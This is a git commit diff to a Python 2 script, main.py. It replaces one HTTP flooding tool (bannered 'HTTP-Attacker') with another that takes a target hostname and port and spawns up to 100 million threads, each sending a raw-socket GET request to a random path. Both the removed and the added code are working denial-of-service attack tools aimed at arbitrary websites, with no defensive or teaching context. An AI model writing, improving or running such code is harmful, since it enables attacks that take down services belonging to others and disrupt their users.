e16ec2943c8779947939454b3f80282b635fb350
KunFay99 <kaffayukiffu@gmail.com>
2025-08-28 00:12:08 +0700

    Update main.py

--- main.py
+++ main.py
@@ -1,47 +1,94 @@
-import threading
-import requests
-import sys
+# -*- coding: utf-8 -*-
 import random
-print '''###############################
-######  ######  HTTP-Attacker #
-##### () #####   by LeeOn123  #
-####      ####                #
-###############################'''
-host = raw_input("Url/ip:")
-thread_num = input("threads:")
+import socket
+import string
+import sys
+import threading
+import time
 
-user_agent = [
-  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1"
-  "Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
-  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
-  "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6",
-  "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1",
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
-  "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5",
-  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
-  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
-  "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
-  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
-  "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
-  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
-  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
-  "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3",
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24",
-  "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"
-       ]
-	   
-def run():
-	if len(sys.argv)>=1:
-		url="http://"+host
-		print "Attacking",host 
-        while True:
-			headers={'User-Agent': random.choice(user_agent)}
-			r = requests.get(url,headers=headers)
-			
-	else:
-		print "It only work on HTTP server!!!"
+# Parse inputs
+host = ""
+ip = ""
+port = 0
+num_requests = 0
 
-for i in range(thread_num):
-    th = threading.Thread(target = run)
-    th.start()
+if len(sys.argv) == 2:
+    port = 80
+    num_requests = 100000000
+elif len(sys.argv) == 3:
+    port = int(sys.argv[2])
+    num_requests = 100000000
+elif len(sys.argv) == 4:
+    port = int(sys.argv[2])
+    num_requests = int(sys.argv[3])
+else:
+    print "ERROR\n Usage: " + sys.argv[0] + " < Hostname > < Port > < Number_of_Attacks >"
+    sys.exit(1)
+
+# Convert FQDN to IP
+try:
+    host = str(sys.argv[1]).replace("https://", "").replace("http://", "").replace("www.", "")
+    ip = socket.gethostbyname(host)
+except socket.gaierror:
+    print " ERROR\n Make sure you entered a correct website"
+    sys.exit(2)
+
+# Create a shared variable for thread counts
+thread_num = 0
+thread_num_mutex = threading.Lock()
+
+
+# Print thread status
+def print_status():
+    global thread_num
+    thread_num_mutex.acquire(True)
+
+    thread_num += 1
+    print "\n " + time.ctime().split(" ")[3] + " " + "[" + str(thread_num) + "] #-#-# Hold Your Tears #-#-#"
+
+    thread_num_mutex.release()
+
+
+# Generate URL Path
+def generate_url_path():
+    msg = str(string.letters + string.digits + string.punctuation)
+    data = "".join(random.sample(msg, 5))
+    return data
+
+
+# Perform the request
+def attack():
+    print_status()
+    url_path = generate_url_path()
+
+    # Create a raw socket
+    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    try:
+        # Open the connection on that raw socket
+        dos.connect((ip, port))
+
+        # Send the request according to HTTP spec
+        dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
+    except socket.error, e:
+        print "\n [ No connection, server may be down ]: " + str(e)
+    finally:
+        # Close our socket gracefully
+        dos.shutdown(socket.SHUT_RDWR)
+        dos.close()
+
+
+print "[#] Attack started on " + host + " (" + ip + ") || Port: " + str(port) + " || # Requests: " + str(num_requests)
+
+# Spawn a thread per request
+all_threads = []
+for i in xrange(num_requests):
+    t1 = threading.Thread(target=attack)
+    t1.start()
+    all_threads.append(t1)
+
+    # Adjusting this sleep time will affect requests per second
+    time.sleep(0.01)
+
+for current_thread in all_threads:
+    current_thread.join()  # Make the main thread wait for the children threads
